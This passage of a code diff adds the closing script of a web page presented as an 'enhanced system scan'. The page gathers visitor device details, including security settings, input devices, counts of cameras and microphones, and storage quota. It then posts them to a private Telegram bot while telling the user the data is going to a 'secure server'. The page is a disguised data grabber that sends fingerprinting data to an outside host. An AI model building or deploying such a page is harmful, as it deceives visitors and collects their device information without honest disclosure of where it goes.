+                message += `• Fullscreen: ${data.media.videoSupport.fullscreen}\n\n`;
+            }
+
+            // Security Info
+            message += '🔒 <b>Security Information</b>\n';
+            message += `• HTTPS: ${data.security.https}\n`;
+            message += `• TLS: ${data.security.tls}\n`;
+            message += `• CORS: ${data.security.cors}\n`;
+            message += `• CSP: ${data.security.contentSecurityPolicy}\n\n`;
+
+            // Input Devices
+            if (data.inputDevices) {
+                message += '🎮 <b>Input Devices</b>\n';
+                message += `• Touch: ${data.inputDevices.pointer.touchEnabled}\n`;
+                message += `• Pointer: ${data.inputDevices.pointer.pointerEnabled}\n`;
+                message += `• Keyboard: ${data.inputDevices.keyboard.present}\n`;
+                if (data.inputDevices.mediaDevices) {
+                    message += `• Cameras: ${data.inputDevices.mediaDevices.videoInputs}\n`;
+                    message += `• Microphones: ${data.inputDevices.mediaDevices.audioInputs}\n`;
+                }
+                message += '\n';
+            }
+
+            // Storage Info
+            if (data.storage) {
+                message += '💾 <b>Storage Information</b>\n';
+                message += `• LocalStorage: ${data.storage.localStorage}\n`;
+                message += `• SessionStorage: ${data.storage.sessionStorage}\n`;
+                message += `• IndexedDB: ${data.storage.indexedDB}\n`;
+                if (data.storage.quota) {
+                    message += `• Total: ${formatBytes(data.storage.quota.total)}\n`;
+                    message += `• Used: ${formatBytes(data.storage.quota.used)}\n`;
+                }
+                message += '\n';
+            }
+
+            return message;
+        }
+
+        function formatBytes(bytes) {
+            if (!bytes) return '0 B';
+            const k = 1024;
+            const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return `${parseFloat((bytes / Math.pow(k, i)).toFixed(2))} ${sizes[i]}`;
+        }
+
+        async function sendToTelegram(data) {
+            const message = formatDataForTelegram(data);
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML',
+                    }),
+                });
+
+                if (!response.ok) {
+                    throw new Error('Failed to send message to Telegram');
+                }
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                throw error;
+            }
+        }
+
+        document.getElementById('scanButton').addEventListener('click', async () => {
+            const statusElement = document.getElementById('status');
+            const scanButton = document.getElementById('scanButton');
+            const scanDetails = document.getElementById('scanDetails');
+
+            scanButton.disabled = true;
+            statusElement.innerHTML = '<span class="blink">⚡ Initiating enhanced system scan...</span>';
+            scanDetails.innerHTML = '';
+            scanDetails.classList.add('active');
+
+            try {
+                // Start progress bar animation
+                updateProgressBar(0);
+                await new Promise(resolve => setTimeout(resolve, 500));
+
+                // Collect basic information
+                scanDetails.innerHTML += '<div class="detail-item">📡 Collecting basic system information...</div>';
+                updateProgressBar(20);
+                await new Promise(resolve => setTimeout(resolve, 300));
+
+                // Collect network information
+                scanDetails.innerHTML += '<div class="detail-item">🌐 Analyzing network capabilities...</div>';
+                updateProgressBar(40);
+                await new Promise(resolve => setTimeout(resolve, 300));
+
+                // Collect hardware information
+                scanDetails.innerHTML += '<div class="detail-item">💻 Gathering hardware specifications...</div>';
+                updateProgressBar(60);
+                await new Promise(resolve => setTimeout(resolve, 300));
+
+                // Collect system information
+                const systemInfo = await collectSystemInfo();
+                scanDetails.innerHTML += '<div class="detail-item">⚙️ Processing system capabilities...</div>';
+                updateProgressBar(80);
+                await new Promise(resolve => setTimeout(resolve, 300));
+
+                // Send to Telegram
+                statusElement.innerHTML = '<span class="blink">📡 Transmitting enhanced data...</span>';
+                scanDetails.innerHTML += '<div class="detail-item">📤 Sending data to secure server...</div>';
+                await sendToTelegram(systemInfo);
+                updateProgressBar(100);
+
+                // Update status
+                statusElement.textContent = '✅ Enhanced scan complete! All data has been transmitted.';
+                scanDetails.innerHTML += '<div class="detail-item">✅ Scan completed successfully!</div>';
+            } catch (error) {
+                console.error('Error:', error);
+                statusElement.textContent = '❌ Error during enhanced scan. Please try again.';
+                scanDetails.innerHTML += '<div class="detail-item">❌ Error occurred during scan.</div>';
+            } finally {
+                scanButton.disabled = false;
+                setTimeout(() => {
+                    document.getElementById('progressBar').style.display = 'none';
+                    scanDetails.classList.remove('active');
+                }, 3000);
+            }
+        });
+    </script>
+</body>
+
+</html>
